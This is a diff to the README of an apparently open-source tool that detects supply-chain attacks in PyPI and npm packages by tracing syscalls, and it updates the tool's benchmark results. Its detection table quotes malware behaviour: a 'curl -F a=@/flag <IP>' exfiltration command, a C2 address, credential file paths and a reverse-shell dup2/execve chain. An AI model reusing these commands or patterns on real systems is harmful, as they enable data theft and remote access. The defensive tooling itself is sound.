@@ -5,11 +5,11 @@
 [![Go Report Card](https://goreportcard.com/badge/github.com/RalianENG/kojuto)](https://goreportcard.com/report/github.com/RalianENG/kojuto)
 [![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg)](https://opensource.org/licenses/MIT)
 
-> Caught you. — Runtime syscall surveillance for package installations.
+> Caught you. — EDR for your dependencies.
 
 [Remember Mar 30th 2026.](https://cloud.google.com/blog/topics/threat-intelligence/north-korea-threat-actor-targets-axios-npm-package)
 
-A supply chain attack detection tool that monitors syscalls during package installation and import to detect suspicious activity. Supports PyPI and npm ecosystems.
+An EDR for package installations — monitors syscalls during install and import to detect supply chain attacks. Supports PyPI and npm ecosystems.
 
 ![kojuto demo — detecting axios/plain-crypto-js supply chain attack](demo.svg)
 
@@ -17,7 +17,7 @@ A supply chain attack detection tool that monitors syscalls during package insta
 
 1. **Download** — Fetch the target package to the host (network allowed)
 2. **Isolate** — Run installation inside a hardened Docker container with network isolation
-3. **Install + Monitor** — Record `connect`, `sendto`, `sendmsg`, `sendmmsg`, `bind`, `listen`, `accept`, `execve`, `openat`, `rename`, and `sendfile` syscalls via strace (or eBPF)
+3. **Install + Monitor** — Record `connect`, `sendto`, `sendmsg`, `sendmmsg`, `bind`, `listen`, `accept`, `execve`, `openat`, `rename`, `dup2`, and `sendfile` syscalls via strace (or eBPF)
 4. **Import + Monitor** — Import/require the package under 3 simulated OS identities (Linux, Windows, macOS) with time shifted +30 days via `libfaketime` to trigger platform-gated and date-gated payloads
 5. **Report** — Output findings as JSON
 
@@ -95,6 +95,7 @@ sudo ./scripts/setup-caps.sh ./kojuto
 | `--runtime` | Container runtime: default (runc) or `runsc` (gVisor) |
 | `--probe-method` | `auto` / `ebpf` / `strace` / `strace-container` (default: `auto`) |
 | `--timeout` | Scan timeout per package (default: `5m`) |
+| `--config` | Config file path (default: `kojuto.yml` in current directory) |
 
 ### Exit Codes
 
@@ -214,26 +215,43 @@ This approach detects environment-aware and delayed-execution supply chain attac
 
 ## Detection Benchmarks
 
-Tested against 79 packages (70 known-clean, 9 known-malicious).
+Validated against 300 randomly sampled malicious packages from [Datadog's malicious-software-packages-dataset](https://github.com/DataDog/malicious-software-packages-dataset) (seed=42, reproducible) and 70 known-clean packages.
 
 | Metric | Result |
 |--------|--------|
-| True Positive Rate | **100%** (9/9 malicious packages detected) |
+| True Positive Rate | **100%** (61/61 installable malicious packages detected) |
 | False Positive Rate | **0%** (0/70 clean packages flagged) |
 | Batch screening speed | **50 PyPI packages in 98s** (single sandbox) |
 
-### Detected attack patterns
+Of the 300 malicious samples, 238 failed to install (dependencies already removed from PyPI) and 1 timed out — expected for archived malware. All 61 that installed successfully were detected.
 
-| Sample | Source | Detected behavior |
-|--------|--------|-------------------|
-| axios-attack-demo | testdata | C2 connection (`142.11.206.73:8000`), credential theft (SSH, AWS, Git, GitHub CLI, netrc), payload execution |
-| a1rn | [Datadog](https://github.com/DataDog/malicious-software-packages-dataset) | Data exfiltration via `curl -F a=@/flag <IP>` |
-| advpruebitaa | Datadog | File creation and directory enumeration via shell commands |
-| 0wneg, antibyfron, asciidrawing, aietelegram, advpruebitaa3 | Datadog | Inline code execution via `python3 -c` during install |
+### Detected attack categories
 
-### Clean package verification
+| Category | Examples | Detection method |
+|----------|----------|-----------------|
+| C2 communication | `aiogram-types-v3` → `147.45.124.42:80`, `airio` → DNS exfil | `connect`/`sendto` to external IPs |
+| Credential theft | `axios-attack-demo` → `.ssh/id_rsa`, `.aws/credentials`, `.git-credentials` | `openat` on ~40 sensitive paths |
+| Reverse shell | `connect → dup2(fd, 0) → dup2(fd, 1) → execve /bin/sh` | `dup2` redirecting stdin/stdout |
+| Persistence | Write to `.bashrc`, `.zshrc`, `.profile`, `crontab` | `openat` with `O_WRONLY`/`O_RDWR` |
+| Data exfiltration | `a1rn` → `curl -F a=@/flag <IP>` | `execve` with `curl`/`wget` |
+| Code execution | `advpruebitaa` → `type nul > prueba11.txt`, `aio3` → `start python3` | `execve` with inline `-c`/`-e` flags |
+| Payload drop | `axios-attack-demo` → `python3 /tmp/ld.py` | `execve` of `/tmp` binaries |
 
-50 popular PyPI packages (flask, django, requests, cryptography, pydantic, etc.) and 20 npm packages (lodash, express, axios, etc.) scanned with zero false positives. Full list in [docs/SPECIFICATION.md](docs/SPECIFICATION.md).
+### Configuration
+
+Sensitive path patterns are customizable via `kojuto.yml` (see [`kojuto.example.yml`](kojuto.example.yml)):
+
+```yaml
+sensitive_paths:
+  include:
+    - "/.config/custom-app/"
+  exclude:
+    - "/.bashrc"   # if your packages legitimately read shell config
+```
+
+### False positive verification
+
+50 popular PyPI packages (flask, django, requests, cryptography, pydantic, etc.) and 20 npm packages (lodash, express, axios, etc.) scanned with zero false positives.
 
 ## Security
 
